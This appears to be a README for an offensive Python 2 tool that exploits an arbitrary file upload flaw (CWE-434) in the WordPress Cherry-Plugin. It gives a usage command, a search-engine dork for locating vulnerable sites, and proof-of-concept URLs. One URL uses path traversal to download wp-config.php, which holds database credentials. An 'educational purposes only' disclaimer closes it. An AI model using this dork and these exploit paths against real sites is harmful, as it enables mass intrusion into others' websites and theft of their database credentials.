# WordPress (CMS) Cherry-Plugin Arbitrary File Upload RCE

Requirement :
- `Python 2.7.18`
- `pip 19.2.3`

How To Usage :
```
python2 sxc.py
```
Example Dork
```
inurl:/wp-content/plugins/cherry-plugin/
```
Proof of Concept
```
Upload: The following file was affected: https://www.example.com/wp-content/plugins/cherry-plugin/admin/import-export/upload.php

Download: https://example.com/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
```
Classification
  `Type : UPLOAD`
  `CWE : CWE-434`

**DISCLAIMER : THIS TOOLS IS FOR EDUCATIONAL PURPOSES ONLY. 
AND WE DO NOT CONDONE ANY ILLEGAL ACTIVITIES**
